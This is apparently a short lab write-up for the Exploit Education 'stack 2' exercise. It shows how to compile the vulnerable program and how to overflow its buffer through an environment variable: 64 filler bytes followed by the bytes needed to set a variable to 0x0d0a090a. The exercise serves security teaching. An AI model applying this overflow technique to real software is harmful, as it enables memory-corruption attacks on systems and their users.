### How to

Build source code
```
clang main.cpp -o stack.2.bin
```

Run and exploit (first try)

```
export ExploitEducation="A" 
./stack.2.bin
```

```
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
```

Run and exploit (solution)

```
export ExploitEducation=`python3 -c "print('a' *64 + '\n\t\n\r')"`
./stack.2.bin
```
